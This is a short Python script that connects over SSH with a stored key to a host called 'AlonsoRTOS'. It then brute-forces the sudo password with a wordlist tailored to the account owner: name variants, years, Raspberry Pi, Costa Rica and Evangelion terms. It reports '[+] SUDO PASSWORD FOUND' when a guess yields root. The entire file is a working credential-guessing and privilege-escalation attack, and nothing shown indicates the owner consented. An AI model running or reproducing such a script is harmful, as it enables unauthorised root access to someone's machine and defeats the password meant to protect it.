import paramiko
import os
import sys

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('AlonsoRTOS', username='alonso', key_filename=os.path.expanduser('~/.ssh/id_ed25519_hil'))

candidates = [
    'alonso', 'Alonso', 'ALONSO', 'alonso123', 'Alonso123', 'Alonso123!', 'alonso1234', 'Alonso1234',
    'alonso2024', 'Alonso2024', 'alonso2025', 'Alonso2025', 'alonso2026', 'Alonso2026',
    'raspberry', 'Raspberry', 'raspberrypi', 'RaspberryPi', 'Raspberrypi', 'Raspberrypi5',
    'costarica', 'CostaRica', 'Costa_Rica', 'CostaRica123',
    'hilrtos', 'HIL-RTOS', 'hil-rtos', 'hil_rtos', 'AlonsoRTOS', 'alonsoRTOS',
    'eva01', 'EVA-01', 'nerv', 'NERV', 'magi', 'MAGI', 'balthasar', 'melchior', 'casper',
    '123456', '12345678', '1234', 'admin', 'root', 'toor'
]

found = None
for p in candidates:
    stdin, stdout, stderr = client.exec_command(f'echo "{p}" | sudo -S id')
    out = stdout.read().decode('utf-8', errors='replace')
    if 'uid=0(root)' in out:
        found = p
        print(f"[+] SUDO PASSWORD FOUND: {p}")
        break

if not found:
    print("[-] Sudo password not found in standard dictionary.")

client.close()

